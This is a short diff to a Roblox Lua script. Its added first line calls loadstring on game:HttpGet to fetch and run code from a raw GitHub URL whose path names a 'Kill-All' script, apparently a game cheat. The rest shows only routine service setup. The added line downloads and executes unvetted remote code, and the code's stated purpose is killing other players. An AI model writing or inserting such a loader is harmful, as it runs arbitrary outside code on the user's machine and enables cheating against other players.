@@ -1,3 +1,6 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Raid-EbVictor/Eb-do-Victor/refs/heads/main/Kill-All/KillName.lua'))()
+
+
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local RunService = game:GetService("RunService")
